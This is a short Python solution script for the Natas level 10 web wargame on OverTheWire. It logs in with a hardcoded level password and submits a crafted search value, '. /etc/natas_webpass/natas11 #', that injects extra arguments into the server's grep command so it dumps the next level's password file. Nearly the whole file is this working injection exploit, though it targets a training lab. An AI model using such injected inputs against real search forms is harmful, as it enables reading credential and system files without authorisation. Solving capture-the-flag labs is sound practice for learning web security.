#!/usr/bin/env python

import requests
import re

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

data = { "needle":". /etc/natas_webpass/natas11 #","submit":"submit"}

url = "http://%s.natas.labs.overthewire.org/"%(username)
# print(url)
with requests.session() as session:
	response = session.post(url , auth = (username, password), data=data)

	content = response.text 

	# print( content)

	print( re.findall("<pre>\n(.*)\n</pre>", content)[0] )

